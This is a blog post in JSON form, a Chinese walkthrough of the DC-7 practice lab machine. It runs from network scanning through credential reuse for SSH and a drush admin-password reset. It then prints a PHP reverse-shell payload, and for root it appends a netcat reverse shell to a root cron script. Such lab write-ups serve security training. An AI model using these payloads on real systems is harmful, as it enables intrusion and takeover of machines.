{"title":"DC-7靶机渗透","uid":"c1eb72cb53103af9058bb7d0064dfe74","slug":"DC-7靶机渗透","date":"2023-01-12T03:44:50.825Z","updated":"2023-01-08T08:27:54.779Z","comments":true,"path":"api/articles/DC-7靶机渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-p988vp_3840x2160.png","content":"<h1 id=\"DC-7靶机渗透全流程\"><a href=\"#DC-7靶机渗透全流程\" class=\"headerlink\" title=\"DC-7靶机渗透全流程\"></a>DC-7靶机渗透全流程</h1><h2 id=\"一-实验环境\"><a href=\"#一-实验环境\" class=\"headerlink\" title=\"一:实验环境\"></a>一:实验环境</h2><p>kali攻击机: 192.168.2.103</p>\n<p>DC-7靶机: 192.168.2.105</p>\n<h2 id=\"二-信息收集\"><a href=\"#二-信息收集\" class=\"headerlink\" title=\"二:信息收集\"></a>二:信息收集</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><p><code>arp-scan -l</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105225815326.png\" alt=\"image-20230105225815326\"></p>\n<h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><p>1.masscan快速扫描端口</p>\n<p><code>masscan --rate=10000 --ports 0-65535 192.168.2.105 </code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105230153971.png\" alt=\"image-20230105230153971\"></p>\n<p>发现80,22端口</p>\n<p>2.nmap精确扫描端口</p>\n<p><code>nmap -p22,80 -sV -A 192.168.2.105 </code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105230437660.png\" alt=\"image-20230105230437660\"></p>\n<p>已经发现cms是drupal 8</p>\n<h3 id=\"web信息收集\"><a href=\"#web信息收集\" class=\"headerlink\" title=\"web信息收集\"></a>web信息收集</h3><p>1.访问<code>192.168.2.105</code></p>\n<p>收集页面信息</p>\n<p><strong>cms: Drupal 8</strong></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105231206954.png\" alt=\"image-20230105231206954\"></p>\n<h3 id=\"目录扫描\"><a href=\"#目录扫描\" class=\"headerlink\" title=\"目录扫描\"></a>目录扫描</h3><p><code>dirb http://192.168.2.105</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106003353101.png\" alt=\"image-20230106003353101\"></p>\n<h3 id=\"利用社工获取网页源码\"><a href=\"#利用社工获取网页源码\" class=\"headerlink\" title=\"利用社工获取网页源码\"></a>利用社工获取网页源码</h3><p>注意到网页底部有个<strong>足迹</strong></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105233027227.png\" alt=\"image-20230105233027227\"></p>\n<p>尝试利用搜索引擎搜索他一下</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105233527183.png\" alt=\"image-20230105233527183\"></p>\n<p>可以看到这个作者的GitHub账号了,点进去看看</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105233648827.png\" alt=\"image-20230105233648827\"></p>\n<p>继续点进这个项目看看,可以看到这就是提示了</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105233728950.png\" alt=\"image-20230105233728950\"></p>\n<p>那这些就是网站源码了</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105233849493.png\" alt=\"image-20230105233849493\"></p>\n<p>可以直接下载下来进行审计分析</p>\n<h2 id=\"三-渗透测试\"><a href=\"#三-渗透测试\" class=\"headerlink\" title=\"三:渗透测试\"></a>三:渗透测试</h2><h3 id=\"信息获取\"><a href=\"#信息获取\" class=\"headerlink\" title=\"信息获取\"></a>信息获取</h3><p>将之前下载下来的网页源码解压</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105234616462.png\" alt=\"image-20230105234616462\"></p>\n<p>查看config.php文件</p>\n<p><code>cat config.php</code></p>\n<p>得到了数据库的账号密码</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105234807232.png\" alt=\"image-20230105234807232\"></p>\n<h3 id=\"远程连接主机\"><a href=\"#远程连接主机\" class=\"headerlink\" title=\"远程连接主机\"></a>远程连接主机</h3><p>既然有了账号和密码,有没有可能之前扫描出来的22端口也能用呢]\\</p>\n<p>尝试远程连接</p>\n<p><code>ssh dc7user@192.168.2.105</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105235247744.png\" alt=\"image-20230105235247744\"></p>\n<p>连接成功</p>\n<h3 id=\"修改admin密码\"><a href=\"#修改admin密码\" class=\"headerlink\" title=\"修改admin密码\"></a>修改admin密码</h3><p>先进行一下系统的信息收集</p>\n<p>可以看到权限挺低的</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105235956015.png\" alt=\"image-20230105235956015\"></p>\n<p>用<code>crontab -l</code>查看计划任务,<code>mail</code>查看邮件</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106001605942.png\" alt=\"image-20230106001605942\"></p>\n<p><code>Cron Daemon</code>不太清楚意思,查询试试</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106001907924.png\" alt=\"image-20230106001907924\"></p>\n<p>那这里的意思大概就是root用户周期性的运行了一个系统任务,脚本的位置在<code>/opt/scripts/backups.sh</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106002341929.png\" alt=\"image-20230106002341929\"></p>\n<p>查看邮件后得知这个系统任务的大概意思是为数据库做一个备份,还给出了备份的位置</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106002131880.png\" alt=\"image-20230106002131880\"></p>\n<p>查看下脚本的权限<code>ls -l</code>，发现www-data拥有执行和写的权限，我们当前权限没有写权限，看来没办法动手脚了。</p>\n<p>但是如果我们获得了www-data的shell 那就可以写点东西进去，然后依靠计划任务，用root去运行，那我们可以获得了root权限的shell了。</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106002735852.png\" alt=\"image-20230106002735852\"></p>\n<p>注意到脚本里有一个drush命令</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106002432811.png\" alt=\"image-20230106002432811\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">可以看到命令是进入 cd &#x2F;var&#x2F;www&#x2F;html&#x2F; 后执行drush。\n\n然后去百度看看 drush是干什么呢？\n\nDrush(Drush &#x3D; Drupal + Shell)就是使用命令行命令来操作Drupal站点，它的命令格式与git类似，都是双字命令（drush + 实际的命令）。既然是命令行命令，也就可以使用其他脚本来实现相同的功能，比如编写shell脚本来实现相同的功能，也的确有不少人这样做过。但是，使用Drush要远优于编写自己的脚本，好处在于，一是可以利用Drush开发社区的力量，二是Drush的命令更加可靠，适用于更多变的环境。\n\nhttps:&#x2F;&#x2F;www.howtoing.com&#x2F;a-beginner-s-guide-to-drush-the-drupal-shell\n\n这里有写一些drush基本语法。</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">drush user-password admin --password&#x3D;&quot;new_pass&quot; \n#想要更改您的密码？就这么简单。\n#记得执行命令前先切换到Drupal的目录下面。\ncd &#x2F;var&#x2F;www&#x2F;html&#x2F;\n#Drupal默认账户是admin  123456为我修改的密码。\ndrush user-password admin --password&#x3D;123456</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106003204970.png\" alt=\"image-20230106003204970\"></p>\n<p>修改成功</p>\n<h3 id=\"获得www-data的shell\"><a href=\"#获得www-data的shell\" class=\"headerlink\" title=\"获得www-data的shell\"></a>获得www-data的shell</h3><p>登录网站后台</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106003516162.png\" alt=\"image-20230106003516162\"></p>\n<p>进入后台,找到能写shell的地方</p>\n<p>在<code>extend</code>中找到可以安装模块</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106004011862.png\" alt=\"image-20230106004011862\"></p>\n<p>下载一个php模块</p>\n<p>下载地址:<code>https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz</code></p>\n<p>直接安装</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106004229509.png\" alt=\"image-20230106004229509\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106004241669.png\" alt=\"image-20230106004241669\"></p>\n<p>启用php模块</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimg_for_typoraimage-20230106004600359.png\" alt=\"image-20230106004600359\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106004538135.png\" alt=\"image-20230106004538135\"></p>\n<p>编辑文章</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106004443226.png\" alt=\"image-20230106004443226\"></p>\n<p>此时可以看到,文章可以用php进行解析了</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106004725783.png\" alt=\"image-20230106004725783\"></p>\n<p>写入一个 反弹shell脚本</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n$sock &#x3D; fsockopen(&quot;192.168.2.103&quot;, &quot;444&quot;);\n$descriptorspec &#x3D; array(\n0 &#x3D;&gt; $sock,\n1 &#x3D;&gt; $sock,\n2 &#x3D;&gt; $sock\n);\n$process &#x3D; proc_open(&#39;&#x2F;bin&#x2F;sh&#39;, $descriptorspec, $pipes);\nproc_close($process);\n?&gt;</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106005028432.png\" alt=\"image-20230106005028432\"></p>\n<p>kali开启nc监听</p>\n<p><code>nc -lvvp 444</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106005119519.png\" alt=\"image-20230106005119519\"></p>\n<p>重新访问下主页</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106005210465.png\" alt=\"image-20230106005210465\"></p>\n<p>反弹成功</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106005243909.png\" alt=\"image-20230106005243909\"></p>\n<p>设置个交互式界面<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106005404424.png\" alt=\"image-20230106005404424\"></p>\n<p>可以看到,现在我们有向脚本里写入代码的权限了</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106011534911.png\" alt=\"image-20230106011534911\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>之前知道了,<code>/opt/scripts/backup.sh</code>会以root权限周期性的运行</p>\n<p>我们可以向backups.sh内写入反弹shell脚本,利用nc就可以完成</p>\n<p>然后如果是正常环境的话就等这个脚本运行的时候就成功了</p>\n<p><code>echo &quot;nc -nv 192.168.2.103 4455 -e /bin/bash&quot; &gt;&gt;backups.sh</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106012850409.png\" alt=\"image-20230106012850409\"></p>\n<p>kali开启侦听</p>\n<p><code>nc -nlvp 4455</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106012318041.png\" alt=\"image-20230106012318041\"></p>\n<p>连接成功</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106012956972.png\" alt=\"image-20230106012956972\"></p>\n<p>他这个默认十五分钟执行一次,等十五分钟就好啦</p>\n<p>得到flag</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106013109841.png\" alt=\"image-20230106013109841\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106013116753.png\" alt=\"image-20230106013116753\"></p>\n","text":"DC-7靶机渗透全流程一:实验环境kali攻击机: 192.168.2.103 DC-7靶机: 192.168.2.105 二:信息收集主机发现arp-scan -l 端口扫描1.masscan快速扫描端口 masscan --rate=10000 --ports 0-65535...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":8,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"DC系列靶机","slug":"DC系列靶机","count":7,"path":"api/tags/DC系列靶机.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#DC-7%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%85%A8%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">DC-7靶机渗透全流程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\">一:实验环境</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">二:信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\">主机发现</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">端口扫描</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">web信息收集</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">目录扫描</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E7%A4%BE%E5%B7%A5%E8%8E%B7%E5%8F%96%E7%BD%91%E9%A1%B5%E6%BA%90%E7%A0%81\"><span class=\"toc-text\">利用社工获取网页源码</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">三:渗透测试</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">信息获取</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E4%B8%BB%E6%9C%BA\"><span class=\"toc-text\">远程连接主机</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E6%94%B9admin%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">修改admin密码</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%BE%97www-data%E7%9A%84shell\"><span class=\"toc-text\">获得www-data的shell</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">提权</span></a></li></ol></li></ol></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"DC-8靶机渗透","uid":"a9be34afb12b0e30cb59efc97ce55ff4","slug":"DC-8靶机渗透","date":"2023-01-12T03:44:50.827Z","updated":"2023-01-08T08:28:00.522Z","comments":true,"path":"api/articles/DC-8靶机渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-vgzygl.jpg","text":"DC-8靶机渗透全流程一:实验环境kali攻击机: 192.168.2.104 DC-8靶机: 192.168.2.105 二:信息收集主机发现arp-scan -l 发现靶机IP地址:192.168.2.105 端口扫描nmap -A 192.168.2.105 发现靶机开放端...","link":"","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":8,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"DC系列靶机","slug":"DC系列靶机","count":7,"path":"api/tags/DC系列靶机.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}},"next_post":{"title":"DC-4靶机渗透","uid":"22a39128968d7f4772194c2471149c6e","slug":"DC-4靶机渗透","date":"2023-01-12T03:44:50.823Z","updated":"2023-01-08T08:27:50.975Z","comments":true,"path":"api/articles/DC-4靶机渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-57ero1.png","text":"DC-4靶机渗透全流程一：实验环境靶机：DC-4（192.168.1.132） 攻击机：kali2022.2（192.168.1.133） 二：信息收集主机发现主机扫描：利用arp-scan工具扫描本地网络 命令：arp-scan -l 扫描本地网络 这里我是用的桥接模式，所以会...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":8,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"DC系列靶机","slug":"DC系列靶机","count":7,"path":"api/tags/DC系列靶机.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}